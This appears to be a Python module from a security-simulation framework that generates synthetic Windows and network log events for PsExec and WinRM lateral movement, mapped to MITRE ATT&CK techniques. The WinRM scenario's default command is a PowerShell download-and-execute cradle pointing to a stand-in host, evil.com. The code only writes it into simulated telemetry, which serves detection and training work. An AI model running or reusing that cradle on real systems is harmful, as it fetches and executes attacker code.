import random
from typing import Any, Dict, List

from src.attacks.base import AttackScenario, MITREMapping, AttackPhase


class PSExecMovement(AttackScenario):
    def __init__(self):
        super().__init__(
            name="PsExec Lateral Movement",
            description="Lateral movement using SMB/Windows Admin Shares.",
            mitre_mappings=[
                MITREMapping(
                    technique_id="T1021.002",
                    technique_name="SMB/Windows Admin Shares",
                    tactic="Lateral Movement",
                    phase=AttackPhase.LATERAL_MOVEMENT
                )
            ],
            severity=4
        )

    def generate_events(self, sim_time: float, rng: random.Random, **kwargs) -> List[Dict[str, Any]]:
        src_ip = kwargs.get("src_ip", "10.0.1.100")
        dst_ip = kwargs.get("dst_ip", "10.0.1.50")
        dst_hostname = kwargs.get("dst_hostname", "srv01")
        username = kwargs.get("username", "admin")
        domain = kwargs.get("domain", "mil.local")
        command = kwargs.get("command_to_execute", "cmd.exe /c whoami")
        
        events = []
        current_time = sim_time
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 4624,
                "hostname": dst_hostname,
                "user": f"{domain}\\{username}",
                "logon_type": 3,
                "src_ip": src_ip
            }
        })
        current_time += rng.uniform(1.0, 3.0)
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 5140,
                "hostname": dst_hostname,
                "user": f"{domain}\\{username}",
                "share_name": f"\\\\{dst_hostname}\\ADMIN$",
                "src_ip": src_ip
            }
        })
        current_time += rng.uniform(1.0, 3.0)
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 7045,
                "hostname": dst_hostname,
                "service_name": "PSEXESVC",
                "image_path": "C:\\Windows\\PSEXESVC.exe"
            }
        })
        current_time += rng.uniform(1.0, 3.0)
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 1,
                "hostname": dst_hostname,
                "process": "cmd.exe",
                "parent_process": "PSEXESVC.exe",
                "command_line": command
            }
        })
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.network",
            "data": {
                "src_ip": src_ip,
                "dest_ip": dst_ip,
                "dest_port": 445,
                "proto": "tcp",
                "conn_state": "SF"
            }
        })
        
        return events


class WinRMMovement(AttackScenario):
    def __init__(self):
        super().__init__(
            name="WinRM Lateral Movement",
            description="Lateral movement using Windows Remote Management.",
            mitre_mappings=[
                MITREMapping(
                    technique_id="T1021.006",
                    technique_name="Windows Remote Management",
                    tactic="Lateral Movement",
                    phase=AttackPhase.LATERAL_MOVEMENT
                )
            ],
            severity=4
        )

    def generate_events(self, sim_time: float, rng: random.Random, **kwargs) -> List[Dict[str, Any]]:
        src_ip = kwargs.get("src_ip", "10.0.1.100")
        dst_ip = kwargs.get("dst_ip", "10.0.1.50")
        dst_hostname = kwargs.get("dst_hostname", "srv01")
        username = kwargs.get("username", "admin")
        domain = kwargs.get("domain", "mil.local")
        command = kwargs.get("powershell_command", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')")
        
        events = []
        current_time = sim_time
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 4624,
                "hostname": dst_hostname,
                "user": f"{domain}\\{username}",
                "logon_type": 3,
                "src_ip": src_ip
            }
        })
        current_time += rng.uniform(1.0, 2.0)
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 1,
                "hostname": dst_hostname,
                "process": "powershell.exe",
                "parent_process": "wsmprovhost.exe",
                "command_line": f"powershell.exe -enc {command.encode('utf-16le').hex()}"
            }
        })
        current_time += rng.uniform(1.0, 2.0)
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 3,
                "hostname": dst_hostname,
                "process": "powershell.exe",
                "dest_port": 5985,
                "dest_ip": dst_ip
            }
        })
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.network",
            "data": {
                "src_ip": src_ip,
                "dest_ip": dst_ip,
                "dest_port": 5985,
                "proto": "tcp",
                "conn_state": "SF"
            }
        })
        
        return events
